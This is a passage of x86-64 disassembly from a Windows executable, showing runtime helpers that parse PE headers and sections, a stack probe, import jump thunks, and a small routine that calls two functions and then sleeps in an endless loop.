   140002551:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002558:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   14000255c:	74 09                	je     0x140002567
   14000255e:	48 85 c9             	test   %rcx,%rcx
   140002561:	74 bd                	je     0x140002520
   140002563:	48 83 e9 01          	sub    $0x1,%rcx
   140002567:	48 83 c0 28          	add    $0x28,%rax
   14000256b:	48 39 c2             	cmp    %rax,%rdx
   14000256e:	75 e8                	jne    0x140002558
   140002570:	31 c0                	xor    %eax,%eax
   140002572:	c3                   	ret
   140002573:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000257a:	00 00 00 00 
   14000257e:	66 90                	xchg   %ax,%ax
   140002580:	48 8b 05 09 1e 00 00 	mov    0x1e09(%rip),%rax        # 0x140004390
   140002587:	31 d2                	xor    %edx,%edx
   140002589:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000258e:	75 0f                	jne    0x14000259f
   140002590:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140002594:	48 01 c1             	add    %rax,%rcx
   140002597:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   14000259d:	74 09                	je     0x1400025a8
   14000259f:	48 89 d0             	mov    %rdx,%rax
   1400025a2:	c3                   	ret
   1400025a3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400025a8:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   1400025ae:	48 0f 44 d0          	cmove  %rax,%rdx
   1400025b2:	48 89 d0             	mov    %rdx,%rax
   1400025b5:	c3                   	ret
   1400025b6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400025bd:	00 00 00 
   1400025c0:	48 8b 15 c9 1d 00 00 	mov    0x1dc9(%rip),%rdx        # 0x140004390
   1400025c7:	31 c0                	xor    %eax,%eax
   1400025c9:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   1400025ce:	75 10                	jne    0x1400025e0
   1400025d0:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   1400025d4:	49 01 d0             	add    %rdx,%r8
   1400025d7:	41 81 38 50 45 00 00 	cmpl   $0x4550,(%r8)
   1400025de:	74 08                	je     0x1400025e8
   1400025e0:	c3                   	ret
   1400025e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400025e8:	66 41 81 78 18 0b 02 	cmpw   $0x20b,0x18(%r8)
   1400025ef:	75 ef                	jne    0x1400025e0
   1400025f1:	48 29 d1             	sub    %rdx,%rcx
   1400025f4:	45 0f b7 48 06       	movzwl 0x6(%r8),%r9d
   1400025f9:	41 0f b7 50 14       	movzwl 0x14(%r8),%edx
   1400025fe:	49 8d 54 10 18       	lea    0x18(%r8,%rdx,1),%rdx
   140002603:	66 45 85 c9          	test   %r9w,%r9w
   140002607:	74 d7                	je     0x1400025e0
   140002609:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   14000260d:	48 8d 04 80          	lea    (%rax,%rax,4),%rax
   140002611:	4c 8d 4c c2 28       	lea    0x28(%rdx,%rax,8),%r9
   140002616:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000261d:	00 00 00 
   140002620:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   140002624:	4c 89 c0             	mov    %r8,%rax
   140002627:	4c 39 c1             	cmp    %r8,%rcx
   14000262a:	72 08                	jb     0x140002634
   14000262c:	03 42 08             	add    0x8(%rdx),%eax
   14000262f:	48 39 c1             	cmp    %rax,%rcx
   140002632:	72 0c                	jb     0x140002640
   140002634:	48 83 c2 28          	add    $0x28,%rdx
   140002638:	4c 39 ca             	cmp    %r9,%rdx
   14000263b:	75 e3                	jne    0x140002620
   14000263d:	31 c0                	xor    %eax,%eax
   14000263f:	c3                   	ret
   140002640:	8b 42 24             	mov    0x24(%rdx),%eax
   140002643:	f7 d0                	not    %eax
   140002645:	c1 e8 1f             	shr    $0x1f,%eax
   140002648:	c3                   	ret
   140002649:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140002650:	4c 8b 1d 39 1d 00 00 	mov    0x1d39(%rip),%r11        # 0x140004390
   140002657:	45 31 c0             	xor    %r8d,%r8d
   14000265a:	66 41 81 3b 4d 5a    	cmpw   $0x5a4d,(%r11)
   140002660:	41 89 ca             	mov    %ecx,%r10d
   140002663:	75 0f                	jne    0x140002674
   140002665:	49 63 4b 3c          	movslq 0x3c(%r11),%rcx
   140002669:	4c 01 d9             	add    %r11,%rcx
   14000266c:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002672:	74 0c                	je     0x140002680
   140002674:	4c 89 c0             	mov    %r8,%rax
   140002677:	c3                   	ret
   140002678:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000267f:	00 
   140002680:	66 81 79 18 0b 02    	cmpw   $0x20b,0x18(%rcx)
   140002686:	75 ec                	jne    0x140002674
   140002688:	8b 81 90 00 00 00    	mov    0x90(%rcx),%eax
   14000268e:	85 c0                	test   %eax,%eax
   140002690:	74 e2                	je     0x140002674
   140002692:	0f b7 51 14          	movzwl 0x14(%rcx),%edx
   140002696:	44 0f b7 49 06       	movzwl 0x6(%rcx),%r9d
   14000269b:	48 8d 54 11 18       	lea    0x18(%rcx,%rdx,1),%rdx
   1400026a0:	66 45 85 c9          	test   %r9w,%r9w
   1400026a4:	74 ce                	je     0x140002674
   1400026a6:	41 8d 49 ff          	lea    -0x1(%r9),%ecx
   1400026aa:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   1400026ae:	4c 8d 4c ca 28       	lea    0x28(%rdx,%rcx,8),%r9
   1400026b3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400026b8:	44 8b 42 0c          	mov    0xc(%rdx),%r8d
   1400026bc:	4c 89 c1             	mov    %r8,%rcx
   1400026bf:	4c 39 c0             	cmp    %r8,%rax
   1400026c2:	72 08                	jb     0x1400026cc
   1400026c4:	03 4a 08             	add    0x8(%rdx),%ecx
   1400026c7:	48 39 c8             	cmp    %rcx,%rax
   1400026ca:	72 14                	jb     0x1400026e0
   1400026cc:	48 83 c2 28          	add    $0x28,%rdx
   1400026d0:	49 39 d1             	cmp    %rdx,%r9
   1400026d3:	75 e3                	jne    0x1400026b8
   1400026d5:	45 31 c0             	xor    %r8d,%r8d
   1400026d8:	4c 89 c0             	mov    %r8,%rax
   1400026db:	c3                   	ret
   1400026dc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400026e0:	4c 01 d8             	add    %r11,%rax
   1400026e3:	eb 0b                	jmp    0x1400026f0
   1400026e5:	0f 1f 00             	nopl   (%rax)
   1400026e8:	41 83 ea 01          	sub    $0x1,%r10d
   1400026ec:	48 83 c0 14          	add    $0x14,%rax
   1400026f0:	8b 48 04             	mov    0x4(%rax),%ecx
   1400026f3:	85 c9                	test   %ecx,%ecx
   1400026f5:	75 07                	jne    0x1400026fe
   1400026f7:	8b 50 0c             	mov    0xc(%rax),%edx
   1400026fa:	85 d2                	test   %edx,%edx
   1400026fc:	74 d7                	je     0x1400026d5
   1400026fe:	45 85 d2             	test   %r10d,%r10d
   140002701:	7f e5                	jg     0x1400026e8
   140002703:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140002707:	4d 01 d8             	add    %r11,%r8
   14000270a:	4c 89 c0             	mov    %r8,%rax
   14000270d:	c3                   	ret
   14000270e:	90                   	nop
   14000270f:	90                   	nop
   140002710:	51                   	push   %rcx
   140002711:	50                   	push   %rax
   140002712:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002718:	48 8d 4c 24 18       	lea    0x18(%rsp),%rcx
   14000271d:	72 19                	jb     0x140002738
   14000271f:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002726:	48 83 09 00          	orq    $0x0,(%rcx)
   14000272a:	48 2d 00 10 00 00    	sub    $0x1000,%rax
   140002730:	48 3d 00 10 00 00    	cmp    $0x1000,%rax
   140002736:	77 e7                	ja     0x14000271f
   140002738:	48 29 c1             	sub    %rax,%rcx
   14000273b:	48 83 09 00          	orq    $0x0,(%rcx)
   14000273f:	58                   	pop    %rax
   140002740:	59                   	pop    %rcx
   140002741:	c3                   	ret
   140002742:	90                   	nop
   140002743:	90                   	nop
   140002744:	90                   	nop
   140002745:	90                   	nop
   140002746:	90                   	nop
   140002747:	90                   	nop
   140002748:	90                   	nop
   140002749:	90                   	nop
   14000274a:	90                   	nop
   14000274b:	90                   	nop
   14000274c:	90                   	nop
   14000274d:	90                   	nop
   14000274e:	90                   	nop
   14000274f:	90                   	nop
   140002750:	48 8b 05 69 1c 00 00 	mov    0x1c69(%rip),%rax        # 0x1400043c0
   140002757:	48 8b 00             	mov    (%rax),%rax
   14000275a:	c3                   	ret
   14000275b:	90                   	nop
   14000275c:	90                   	nop
   14000275d:	90                   	nop
   14000275e:	90                   	nop
   14000275f:	90                   	nop
   140002760:	48 8b 05 49 1c 00 00 	mov    0x1c49(%rip),%rax        # 0x1400043b0
   140002767:	48 8b 00             	mov    (%rax),%rax
   14000276a:	c3                   	ret
   14000276b:	90                   	nop
   14000276c:	90                   	nop
   14000276d:	90                   	nop
   14000276e:	90                   	nop
   14000276f:	90                   	nop
   140002770:	48 8b 05 f9 49 00 00 	mov    0x49f9(%rip),%rax        # 0x140007170
   140002777:	c3                   	ret
   140002778:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000277f:	00 
   140002780:	48 89 c8             	mov    %rcx,%rax
   140002783:	48 87 05 e6 49 00 00 	xchg   %rax,0x49e6(%rip)        # 0x140007170
   14000278a:	c3                   	ret
   14000278b:	90                   	nop
   14000278c:	90                   	nop
   14000278d:	90                   	nop
   14000278e:	90                   	nop
   14000278f:	90                   	nop
   140002790:	55                   	push   %rbp
   140002791:	53                   	push   %rbx
   140002792:	48 83 ec 28          	sub    $0x28,%rsp
   140002796:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   14000279b:	89 cb                	mov    %ecx,%ebx
   14000279d:	e8 2e 00 00 00       	call   0x1400027d0
   1400027a2:	89 d9                	mov    %ebx,%ecx
   1400027a4:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
   1400027a8:	48 c1 e2 04          	shl    $0x4,%rdx
   1400027ac:	48 01 d0             	add    %rdx,%rax
   1400027af:	48 83 c4 28          	add    $0x28,%rsp
   1400027b3:	5b                   	pop    %rbx
   1400027b4:	5d                   	pop    %rbp
   1400027b5:	c3                   	ret
   1400027b6:	90                   	nop
   1400027b7:	90                   	nop
   1400027b8:	90                   	nop
   1400027b9:	90                   	nop
   1400027ba:	90                   	nop
   1400027bb:	90                   	nop
   1400027bc:	90                   	nop
   1400027bd:	90                   	nop
   1400027be:	90                   	nop
   1400027bf:	90                   	nop
   1400027c0:	ff 25 7a 5a 00 00    	jmp    *0x5a7a(%rip)        # 0x140008240
   1400027c6:	90                   	nop
   1400027c7:	90                   	nop
   1400027c8:	ff 25 7a 5a 00 00    	jmp    *0x5a7a(%rip)        # 0x140008248
   1400027ce:	90                   	nop
   1400027cf:	90                   	nop
   1400027d0:	ff 25 82 5a 00 00    	jmp    *0x5a82(%rip)        # 0x140008258
   1400027d6:	90                   	nop
   1400027d7:	90                   	nop
   1400027d8:	ff 25 82 5a 00 00    	jmp    *0x5a82(%rip)        # 0x140008260
   1400027de:	90                   	nop
   1400027df:	90                   	nop
   1400027e0:	ff 25 82 5a 00 00    	jmp    *0x5a82(%rip)        # 0x140008268
   1400027e6:	90                   	nop
   1400027e7:	90                   	nop
   1400027e8:	ff 25 82 5a 00 00    	jmp    *0x5a82(%rip)        # 0x140008270
   1400027ee:	90                   	nop
   1400027ef:	90                   	nop
   1400027f0:	ff 25 82 5a 00 00    	jmp    *0x5a82(%rip)        # 0x140008278
   1400027f6:	90                   	nop
   1400027f7:	90                   	nop
   1400027f8:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x140008290
   1400027fe:	90                   	nop
   1400027ff:	90                   	nop
   140002800:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x140008298
   140002806:	90                   	nop
   140002807:	90                   	nop
   140002808:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082a0
   14000280e:	90                   	nop
   14000280f:	90                   	nop
   140002810:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082a8
   140002816:	90                   	nop
   140002817:	90                   	nop
   140002818:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082b0
   14000281e:	90                   	nop
   14000281f:	90                   	nop
   140002820:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082b8
   140002826:	90                   	nop
   140002827:	90                   	nop
   140002828:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082c0
   14000282e:	90                   	nop
   14000282f:	90                   	nop
   140002830:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082c8
   140002836:	90                   	nop
   140002837:	90                   	nop
   140002838:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082d0
   14000283e:	90                   	nop
   14000283f:	90                   	nop
   140002840:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082d8
   140002846:	90                   	nop
   140002847:	90                   	nop
   140002848:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082e0
   14000284e:	90                   	nop
   14000284f:	90                   	nop
   140002850:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082e8
   140002856:	90                   	nop
   140002857:	90                   	nop
   140002858:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082f0
   14000285e:	90                   	nop
   14000285f:	90                   	nop
   140002860:	ff 25 92 5a 00 00    	jmp    *0x5a92(%rip)        # 0x1400082f8
   140002866:	90                   	nop
   140002867:	90                   	nop
   140002868:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000286f:	00 
   140002870:	ff 25 ba 59 00 00    	jmp    *0x59ba(%rip)        # 0x140008230
   140002876:	90                   	nop
   140002877:	90                   	nop
   140002878:	ff 25 aa 59 00 00    	jmp    *0x59aa(%rip)        # 0x140008228
   14000287e:	90                   	nop
   14000287f:	90                   	nop
   140002880:	ff 25 9a 59 00 00    	jmp    *0x599a(%rip)        # 0x140008220
   140002886:	90                   	nop
   140002887:	90                   	nop
   140002888:	ff 25 8a 59 00 00    	jmp    *0x598a(%rip)        # 0x140008218
   14000288e:	90                   	nop
   14000288f:	90                   	nop
   140002890:	ff 25 7a 59 00 00    	jmp    *0x597a(%rip)        # 0x140008210
   140002896:	90                   	nop
   140002897:	90                   	nop
   140002898:	ff 25 6a 59 00 00    	jmp    *0x596a(%rip)        # 0x140008208
   14000289e:	90                   	nop
   14000289f:	90                   	nop
   1400028a0:	ff 25 5a 59 00 00    	jmp    *0x595a(%rip)        # 0x140008200
   1400028a6:	90                   	nop
   1400028a7:	90                   	nop
   1400028a8:	ff 25 4a 59 00 00    	jmp    *0x594a(%rip)        # 0x1400081f8
   1400028ae:	90                   	nop
   1400028af:	90                   	nop
   1400028b0:	ff 25 3a 59 00 00    	jmp    *0x593a(%rip)        # 0x1400081f0
   1400028b6:	90                   	nop
   1400028b7:	90                   	nop
   1400028b8:	ff 25 2a 59 00 00    	jmp    *0x592a(%rip)        # 0x1400081e8
   1400028be:	90                   	nop
   1400028bf:	90                   	nop
   1400028c0:	ff 25 1a 59 00 00    	jmp    *0x591a(%rip)        # 0x1400081e0
   1400028c6:	90                   	nop
   1400028c7:	90                   	nop
   1400028c8:	ff 25 0a 59 00 00    	jmp    *0x590a(%rip)        # 0x1400081d8
   1400028ce:	90                   	nop
   1400028cf:	90                   	nop
   1400028d0:	ff 25 fa 58 00 00    	jmp    *0x58fa(%rip)        # 0x1400081d0
   1400028d6:	90                   	nop
   1400028d7:	90                   	nop
   1400028d8:	ff 25 ea 58 00 00    	jmp    *0x58ea(%rip)        # 0x1400081c8
   1400028de:	90                   	nop
   1400028df:	90                   	nop
   1400028e0:	ff 25 da 58 00 00    	jmp    *0x58da(%rip)        # 0x1400081c0
   1400028e6:	90                   	nop
   1400028e7:	90                   	nop
   1400028e8:	ff 25 ca 58 00 00    	jmp    *0x58ca(%rip)        # 0x1400081b8
   1400028ee:	90                   	nop
   1400028ef:	90                   	nop
   1400028f0:	ff 25 1a 5a 00 00    	jmp    *0x5a1a(%rip)        # 0x140008310
   1400028f6:	90                   	nop
   1400028f7:	90                   	nop
   1400028f8:	ff 25 0a 5a 00 00    	jmp    *0x5a0a(%rip)        # 0x140008308
   1400028fe:	90                   	nop
   1400028ff:	90                   	nop
   140002900:	53                   	push   %rbx
   140002901:	48 83 ec 20          	sub    $0x20,%rsp
   140002905:	e8 06 ee ff ff       	call   0x140001710
   14000290a:	31 c9                	xor    %ecx,%ecx
   14000290c:	e8 3f ec ff ff       	call   0x140001550
   140002911:	48 8b 1d f8 58 00 00 	mov    0x58f8(%rip),%rbx        # 0x140008210
   140002918:	b9 10 27 00 00       	mov    $0x2710,%ecx
   14000291d:	ff d3                	call   *%rbx
   14000291f:	eb f7                	jmp    0x140002918
   140002921:	90                   	nop
   140002922:	90                   	nop
   140002923:	90                   	nop
   140002924:	90                   	nop
   140002925:	90                   	nop
   140002926:	90                   	nop
   140002927:	90                   	nop
   140002928:	90                   	nop
   140002929:	90                   	nop
   14000292a:	90                   	nop
   14000292b:	90                   	nop
   14000292c:	90                   	nop
   14000292d:	90                   	nop
   14000292e:	90                   	nop
   14000292f:	90                   	nop
   140002930:	e9 2b eb ff ff       	jmp    0x140001460
   140002935:	90                   	nop
   140002936:	90                   	nop
   140002937:	90                   	nop
   140002938:	90                   	nop
   140002939:	90                   	nop
   14000293a:	90                   	nop
   14000293b:	90                   	nop
   14000293c:	90                   	nop
   14000293d:	90                   	nop
   14000293e:	90                   	nop
   14000293f:	90                   	nop
   140002940:	ff                   	(bad)
   140002941:	ff                   	(bad)
   140002942:	ff                   	(bad)
   140002943:	ff                   	(bad)
   140002944:	ff                   	(bad)
   140002945:	ff                   	(bad)
   140002946:	ff                   	(bad)
   140002947:	ff 30                	push   (%rax)
   140002949:	29 00                	sub    %eax,(%rax)
   14000294b:	40 01 00             	rex add %eax,(%rax)
	...
   140002956:	00 00                	add    %al,(%rax)
   140002958:	ff                   	(bad)
   140002959:	ff                   	(bad)
   14000295a:	ff                   	(bad)
   14000295b:	ff                   	(bad)
   14000295c:	ff                   	(bad)
   14000295d:	ff                   	(bad)
   14000295e:	ff                   	(bad)
   14000295f:	ff 00                	incl   (%rax)
   140002961:	00 00                	add    %al,(%rax)
   140002963:	00 00                	add    %al,(%rax)
   140002965:	00 00                	add    %al,(%rax)
	...
